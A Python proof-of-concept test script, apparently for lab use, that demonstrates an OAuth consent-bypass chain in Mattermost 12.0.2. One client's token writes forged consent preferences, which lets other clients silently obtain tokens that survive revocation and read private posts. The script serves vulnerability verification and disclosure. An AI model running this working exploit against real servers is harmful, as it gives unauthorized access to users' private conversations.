#!/usr/bin/env python3
"""Multi-component Mattermost 12.0.2 security E2E: DCR -> OAuth A -> user preferences -> OAuth B implicit consent -> revoke A -> B token -> private posts.
All accounts, teams, clients, private posts and callback domains are disposable lab resources.
Never print tokens, authorization codes, or credentials.
"""
import json, secrets, urllib.request, urllib.error, urllib.parse, hashlib, base64, sys
BASE="http://127.0.0.1:8065"
RESULTS=[]
CALLBACK="https://approved.example.invalid/cb"
class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self,req,fp,code,msg,headers,newurl):
        return None
OPENER=urllib.request.build_opener(NoRedirect)
def request(method,path,data=None,token=None,form=False):
    headers={"Content-Type":"application/x-www-form-urlencoded" if form else "application/json"}
    if token:headers["Authorization"]="Bearer "+token
    body=(urllib.parse.urlencode(data).encode() if form else json.dumps(data).encode()) if data is not None else None
    req=urllib.request.Request(BASE+path,method=method,data=body,headers=headers)
    try:
        with OPENER.open(req,timeout=20) as r: status,raw,hs=r.status,r.read(),r.headers
    except urllib.error.HTTPError as e: status,raw,hs=e.code,e.read(),e.headers
    try:out=json.loads(raw.decode()) if raw else {}
    except Exception:out={}
    return status,out,hs
def check(name,passed,observation,expected):
    row={"test":name,"pass":bool(passed),"observed":observation,"expected":expected}
    RESULTS.append(row);print("CHECK "+json.dumps(row,sort_keys=True),flush=True)
def must(code,want,what):
    if code!=want:raise RuntimeError(what+": expected "+str(want)+" got "+str(code))
def login(name,pw):
    st,_,h=request("POST","/api/v4/users/login",{"login_id":name,"password":pw})
    must(st,200,"login")
    return h["Token"]
def oauth_register():
    st,j,_=request("POST","/api/v4/oauth/apps/register",{"redirect_uris":[CALLBACK],
       "token_endpoint_auth_method":"none","client_name":"owned-dsi-"+secrets.token_hex(5)})
    must(st,201,"DCR")
    return j["client_id"]
def challenge():
    verifier=secrets.token_urlsafe(49)
    digest=hashlib.sha256(verifier.encode()).digest()
    c=base64.urlsafe_b64encode(digest).decode().rstrip("=")
    return verifier,c
def grant_spec(cid,challenge):
    return {"client_id":cid,"response_type":"code","redirect_uri":CALLBACK,
            "scope":"user","state":"owned-only",
            "code_challenge":challenge,"code_challenge_method":"S256"}
def grant_code(cid,verifier,normal_token):
    digest=base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).decode().rstrip("=")
    st,out,_=request("POST","/oauth/authorize",grant_spec(cid,digest),normal_token)
    must(st,200,"owner explicit grant")
    url=out.get("redirect","")
    return urllib.parse.parse_qs(urllib.parse.urlparse(url).query).get("code",[""])[0]
def exchange(cid,code,verifier):
    return request("POST","/oauth/access_token",{"grant_type":"authorization_code",
       "client_id":cid,"redirect_uri":CALLBACK,"code":code,"code_verifier":verifier},form=True)
def browser_visit(cid,challenge,token):
    qs=urllib.parse.urlencode(grant_spec(cid,challenge))
    st,out,h=request("GET","/oauth/authorize?"+qs,token=token)
    return st,out,h
def main():
    pw="Aa9!"+secrets.token_urlsafe(24); users=[]
    for i in (1,2):
        name="oauthch"+str(i)+secrets.token_hex(5)
        st,obj,_=request("POST","/api/v4/users",{"username":name,"email":name+"@example.invalid","password":pw})
        must(st,201,"create owned user")
        users.append((name,obj["id"]))
    owner_name,owner_id=users[0]
    victim_name,victim_id=users[1]
    owner_token=login(owner_name,pw)
    normal_token=login(victim_name,pw)
    st,ordinary_me,_=request("GET","/api/v4/users/me",token=normal_token)
    roles=ordinary_me.get("roles","").split()
    check("A00_victim_is_ordinary_nonadmin",
          st==200 and "system_user" in roles and "system_admin" not in roles,
          {"status":st,"ordinary_user":("system_user" in roles),
           "no_system_admin_role":("system_admin" not in roles)},
          "authenticated ordinary system_user without system_admin")
    if st!=200 or "system_admin" in roles:raise RuntimeError("Actor boundary not ordinary user")
    sf=secrets.token_hex(5)
    st,team,_=request("POST","/api/v4/teams",{"name":"labvault"+sf,"display_name":"OAuth Consent Lab","type":"O"},owner_token)
    if st!=201:
        print("TEAM_CREATE_ERROR "+json.dumps({"status":st,"error_id":team.get("id"),"message":team.get("message")}),flush=True)
    must(st,201,"isolated team")
    tid=team["id"]
    st,_,_=request("POST",f"/api/v4/teams/{tid}/members",{"team_id":tid,"user_id":victim_id},owner_token)
    must(st,201,"add victim to team")
    st,channel,_=request("POST","/api/v4/channels",{
       "team_id":tid,"name":"vault"+sf,"display_name":"Owned Private Canary","type":"P"},owner_token)
    must(st,201,"create private channel")
    cid=channel["id"]
    st,_,_=request("POST",f"/api/v4/channels/{cid}/members",{"user_id":victim_id},owner_token)
    must(st,201,"add victim to private channel")
    canary="PRIVATE_OAUTH_CONSENT_E2E_"+sf
    st,post,_=request("POST","/api/v4/posts",{"channel_id":cid,"message":canary},owner_token)
    must(st,201,"write private canary")
    st,vpriv,_=request("GET",f"/api/v4/channels/{cid}/posts",token=normal_token)
    check("A01_normal_user_private_posts_control",st==200 and canary in json.dumps(vpriv),
          {"status":st,"canary":canary in json.dumps(vpriv)},"victim may read own private canary")
    st,_,_=request("GET",f"/api/v4/channels/{cid}/posts")
    check("A02_anonymous_private_posts_denied",st==401,st,401)

    app_a=oauth_register()
    app_b=oauth_register()
    app_c=oauth_register()
    verifier_a,pkce_a=challenge();verifier_b,pkce_b=challenge();verifier_c,pkce_c=challenge()
    st,out,h=browser_visit(app_b,pkce_b,normal_token)
    # Verify browser has NOT granted app B yet, and does not redirect to its callback.
    check("A03_unapproved_app_B_requires_consent",st==200 and h.get("Location") is None,
          {"status":st,"redirect_issued":h.get("Location") is not None},"200 consent HTML, no code")

    code_a=grant_code(app_a,verifier_a,normal_token)
    if not code_a:raise RuntimeError("Cannot get A authorization code")
    st,grant_a,_=exchange(app_a,code_a,verifier_a)
    must(st,200,"OAuth A token")
    access_a=grant_a.get("access_token","")
    if not access_a:raise RuntimeError("Missing A token")
    st,me,_=request("GET","/api/v4/users/me",token=access_a)
    check("A04_A_OAuth_session_is_victim",st==200 and me.get("id")==victim_id,
          {"status":st,"bound_to_victim":me.get("id")==victim_id},"OAuth A limited to consenting user")

    st,_,_=request("POST","/oauth/authorize",grant_spec(app_b,pkce_b),token=access_a)
    check("A05_OAuth_A_cannot_directly_approve_B",st==403,st,403)
    # The OAuth A session itself cannot auto-approve unconsented B via GET yet.
    st,_,h=browser_visit(app_b,pkce_b,access_a)
    check("A05B_OAuth_A_GET_B_no_automatic_grant_pre_injection",st==200 and not h.get("Location"),
          {"status":st,"code_redirect":bool(h.get("Location"))},"200 consent page, no code")

    forged={"user_id":victim_id,"category":"oauth_app","name":app_b,"value":"user"}
    forged_c={"user_id":victim_id,"category":"oauth_app","name":app_c,"value":"user"}
    st,_,_=request("PUT",f"/api/v4/users/{victim_id}/preferences",[forged,forged_c],token=access_a)
    check("A06_OAuth_A_injects_B_authorization_preference",st==200,
          {"status":st,"authorization_preference_written":st==200},
          "200 preference written despite OAuth grant restriction")
    if st!=200:raise RuntimeError("No forged consent preference, cannot conclude cross-feature bypass")
    st,pref,_=request("GET",f"/api/v4/users/{victim_id}/preferences/oauth_app/name/{app_b}",token=normal_token)
    check("A07_fake_consent_preference_persisted",st==200 and pref.get("name")==app_b,
          {"status":st,"preference_exists":pref.get("name")==app_b},"B appears preapproved")

    # Other-user boundary control: app A must not write owner admin's preferences.
    st,_,_=request("PUT",f"/api/v4/users/{owner_id}/preferences",[
       {"user_id":owner_id,"category":"oauth_app","name":app_b,"value":"user"}],token=access_a)
    check("A08_other_user_preference_denied",st in (403,404),st,"403/404")

    # NO SECOND VICTIM VISIT: OAuth app A, acting through its own OAuth bearer session,
    # now uses GET /oauth/authorize to cause auto-approval for client B.
    # Direct POST was 403 (above); GET's saved-consent shortcut is the cross-feature bypass.
    st,_,h=browser_visit(app_b,pkce_b,access_a)
    location=h.get("Location","")
    loc=urllib.parse.urlparse(location)
    code_via_a=urllib.parse.parse_qs(loc.query).get("code",[""])[0]
    check("A08B_OAuth_A_GET_B_silently_mints_authorization_code",
          st in (302,303) and loc.netloc=="approved.example.invalid" and bool(code_via_a),
          {"status":st,"callback_correct":loc.netloc=="approved.example.invalid",
           "code_issued_to_B":bool(code_via_a)},
          "OAuth bearer A gets code for B using GET, bypassing POST 403")
    if not code_via_a:raise RuntimeError("No OAuth code B from application A alone")
    st,issued_b,_=exchange(app_b,code_via_a,verifier_b)
    token_b=issued_b.get("access_token","")
    check("A08C_A_obtains_B_token_without_additional_user_action",
          st==200 and bool(token_b),
          {"status":st,"B_token_issued":bool(token_b)},
          "A chains into B session without victim visiting B URL")
    if not token_b:raise RuntimeError("A could not obtain OAuth B token")

    # User revokes exactly A through its legitimate OAuth deauthorization UI endpoint.
    st,_,_=request("POST","/oauth/deauthorize",{"client_id":app_a},token=normal_token)
    check("A09_victim_revokes_A_app",st==200,st,200)
    if st!=200:raise RuntimeError("A revocation not verified")
    st,_,_=request("GET","/api/v4/users/me",token=access_a)
    check("A10_A_token_invalid_after_revocation",st==401,st,401)

    # Token B was acquired by OAuth A itself before A was revoked, with no
    # victim browser interaction beyond A's original explicit OAuth grant.
    st,posts,_=request("GET",f"/api/v4/channels/{cid}/posts",token=token_b)
    check("A11_B_token_persists_after_A_revocation_without_victim_visit",
          st==200 and canary in json.dumps(posts),
          {"status":st,"private_canary_accessible":canary in json.dumps(posts)},
          "B remains authorized after A is revoked; no victim B visit needed")

    # Independent second client C: after A is revoked, victim's normal browser
    # visits C's authorization URL and gets silently redirected without clicking consent.
    st,_,h=browser_visit(app_c,pkce_c,normal_token)
    redirect=h.get("Location","")
    auth_uri=urllib.parse.urlparse(redirect)
    code_c=urllib.parse.parse_qs(auth_uri.query).get("code",[""])[0]
    check("A12_C_gets_code_without_consent_after_A_revoked",
          st in (302,303) and auth_uri.netloc=="approved.example.invalid" and bool(code_c),
          {"status":st,"callback_target_matched":auth_uri.netloc=="approved.example.invalid",
           "new_authorization_code_issued":bool(code_c)},
          "GET OAuth authorize silently issues C authorization code")
    if not code_c:raise RuntimeError("No code C; no token exchange")
    st,grant_c,_=exchange(app_c,code_c,verifier_c)
    token_c=grant_c.get("access_token","")
    check("A13_C_gets_fresh_OAuth_token_after_A_revocation",
          st==200 and bool(token_c),
          {"status":st,"token_issued":bool(token_c)},
          "200 OAuth C token without explicit C consent")
    if not token_c:raise RuntimeError("No C token")
    st,posts,_=request("GET",f"/api/v4/channels/{cid}/posts",token=token_c)
    check("A14_C_reads_private_content_after_A_revocation",
          st==200 and canary in json.dumps(posts),
          {"status":st,"private_canary_accessible":canary in json.dumps(posts)},
          "C can read user's private post using fresh token after A revoked")
    st,_,_=request("GET",f"/api/v4/channels/{cid}/posts",token=access_a)
    check("A15_revoked_A_cannot_read_same_content",st==401,st,401)
    print("RESULTS "+json.dumps({
       "chain":"DCR A/B/C -> victim grants A once -> A OAuth bearer writes B/C oauth_app preferences -> A GET /oauth/authorize B (POST denied 403) -> obtains B token without user B interaction -> victim revokes A -> A dead, B reads private posts -> C gets fresh post-revocation grant without consent",
       "failed":[r["test"] for r in RESULTS if not r["pass"]],"total":len(RESULTS)},sort_keys=True),flush=True)
    if any(not x["pass"] for x in RESULTS):sys.exit(2)
if __name__=="__main__":
    try:main()
    except Exception as e:
        print("E2E_ERROR "+type(e).__name__+": "+str(e),flush=True)
        sys.exit(1)
